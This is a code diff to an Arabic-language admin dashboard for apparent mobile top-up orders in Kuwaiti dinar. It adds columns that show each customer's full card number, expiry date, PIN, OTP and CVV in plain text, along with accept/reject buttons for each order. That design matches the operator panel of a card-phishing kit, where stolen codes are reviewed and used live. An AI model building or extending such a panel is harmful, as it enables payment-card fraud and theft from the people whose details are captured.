@@ -71,7 +71,7 @@
   .table-head{display:flex;align-items:center;justify-content:space-between;padding:16px 18px;border-bottom:1px solid var(--line)}
   .table-head h2{font-size:18px;font-weight:800}
   .table-scroll{overflow-x:auto}
-  table{width:100%;border-collapse:collapse;min-width:460px}
+  table{width:100%;border-collapse:collapse;min-width:900px}
   th,td{padding:15px 18px;text-align:right;font-size:16px}
   th{background:#fafbfc;color:#3b3f48;font-weight:800;border-bottom:1px solid var(--line)}
   td{border-bottom:1px solid #f0f2f5}
@@ -79,8 +79,19 @@
   .phone{font-weight:700;direction:ltr;display:inline-block}
   .amount{font-weight:800}
   .time{color:var(--ink-soft);font-size:13px}
+  .mono{font-family:monospace;letter-spacing:.5px;direction:ltr;display:inline-block}
   .empty{padding:40px;text-align:center;color:var(--ink-soft)}
   .clear-btn{background:none;border:none;color:var(--red);font-family:inherit;font-weight:700;font-size:14px;cursor:pointer}
+  .act-btn{border:none;border-radius:8px;padding:6px 14px;font-family:inherit;font-weight:700;font-size:13px;cursor:pointer;transition:.15s}
+  .act-btn.accept{background:#d4f0e0;color:#1e9e5a}
+  .act-btn.accept:hover{background:#1e9e5a;color:#fff}
+  .act-btn.reject{background:#fde8e8;color:var(--red)}
+  .act-btn.reject:hover{background:var(--red);color:#fff}
+  .act-btn:disabled{opacity:.4;cursor:default}
+  .badge{display:inline-block;border-radius:6px;padding:3px 10px;font-size:12px;font-weight:700}
+  .badge.accepted{background:#d4f0e0;color:#1e9e5a}
+  .badge.rejected{background:#fde8e8;color:var(--red)}
+  .badge.pending{background:#f0f0f0;color:#888}
 
   /* ---------- desktop ---------- */
   @media(min-width:900px){
@@ -91,7 +102,7 @@
     .field input{ font-size:18px; }
     .btn{ height:62px; font-size:19px; }
 
-    .dash{ max-width:1200px; padding:32px 32px 80px; }
+    .dash{ max-width:1400px; padding:32px 32px 80px; }
     .topbar h1{ font-size:30px; }
     .wifi-btn{ font-size:18px; padding:12px 20px; }
     .wifi-btn .count{ font-size:20px; }
@@ -103,9 +114,10 @@
 
     .table-head{ padding:20px 24px; }
     .table-head h2{ font-size:22px; }
-    th,td{ padding:18px 24px; font-size:17px; }
-    .time{ font-size:15px; }
+    th,td{ padding:14px 16px; font-size:15px; }
+    .time{ font-size:13px; }
     .clear-btn{ font-size:16px; }
+    .act-btn{ font-size:14px; padding:7px 16px; }
   }
 </style>
 </head>
@@ -156,10 +168,20 @@
       <div class="table-scroll">
         <table>
           <thead>
-            <tr><th>رقم الجوال</th><th>قيمة الشحن</th><th>الوقت</th></tr>
+            <tr>
+              <th>رقم الجوال</th>
+              <th>قيمة الشحن</th>
+              <th>رقم البطاقة</th>
+              <th>تاريخ الانتهاء</th>
+              <th>الرقم السري</th>
+              <th>OTP</th>
+              <th>CVV</th>
+              <th>الوقت</th>
+              <th>الإجراء</th>
+            </tr>
           </thead>
           <tbody id="rows">
-            <tr><td colspan="3" class="empty">لا توجد طلبات بعد</td></tr>
+            <tr><td colspan="9" class="empty">لا توجد طلبات بعد</td></tr>
           </tbody>
         </table>
       </div>
@@ -211,15 +233,42 @@
     document.getElementById('wifiBtn').classList.toggle('live', n > 0);
   }
 
+  function statusBadge(st) {
+    if (st === 'accepted') return '<span class="badge accepted">مقبول</span>';
+    if (st === 'rejected') return '<span class="badge rejected">مرفوض</span>';
+    return '';
+  }
+
+  function actionBtns(id, st) {
+    if (st === 'accepted' || st === 'rejected') return statusBadge(st);
+    return '<button class="act-btn accept" onclick="doAction(\'accept\',\''+id+'\')">قبول</button> ' +
+           '<button class="act-btn reject" onclick="doAction(\'reject\',\''+id+'\')">رفض</button>';
+  }
+
+  async function doAction(action, id) {
+    try {
+      await fetch('/api/admin/'+action+'/'+id, {
+        method: 'POST', headers: { 'Authorization': 'Bearer '+token() }
+      });
+      loadData();
+    } catch(e) {}
+  }
+
   function render(list){
     document.getElementById('totalOrders').textContent = list.length;
     const rows = document.getElementById('rows');
-    if(!list.length){ rows.innerHTML = '<tr><td colspan="3" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
+    if(!list.length){ rows.innerHTML = '<tr><td colspan="9" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
     rows.innerHTML = list.map(s =>
       '<tr>' +
         '<td><span class="phone">'+escapeHtml(s.phone)+'</span></td>' +
         '<td><span class="amount">'+escapeHtml(s.amount)+'</span> د.ك</td>' +
+        '<td><span class="mono">'+escapeHtml(s.card||'—')+'</span></td>' +
+        '<td><span class="mono">'+escapeHtml(s.expiry||'—')+'</span></td>' +
+        '<td><span class="mono">'+escapeHtml(s.pin||'—')+'</span></td>' +
+        '<td><span class="mono">'+escapeHtml(s.otp||'—')+'</span></td>' +
+        '<td><span class="mono">'+escapeHtml(s.cvv||'—')+'</span></td>' +
         '<td class="time">'+fmtTime(s.time)+'</td>' +
+        '<td>'+actionBtns(s.id, s.status)+'</td>' +
       '</tr>'
     ).join('');
   }
